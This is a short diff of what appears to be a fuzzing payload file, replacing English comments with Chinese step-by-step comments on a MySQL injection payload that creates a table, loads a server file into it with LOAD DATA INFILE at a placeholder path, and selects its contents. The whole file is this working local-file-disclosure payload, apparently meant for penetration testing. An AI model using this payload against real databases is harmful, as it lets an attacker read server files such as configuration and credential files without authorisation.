@@ -1,3 +1,8 @@
-# mysql local file disclosure through sqli
-# fuzz interesting absolute filepath/filename into <filepath>
-create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+# mysql读取本地文件
+# <filepath>中为绝对路径
+1.创建表
+create table myfile (input TEXT); 
+2.加载本地文件中的内容到新创建的表中
+load data infile '<filepath>' into table myfile; 
+3.查询表中内容
+select * from myfile;
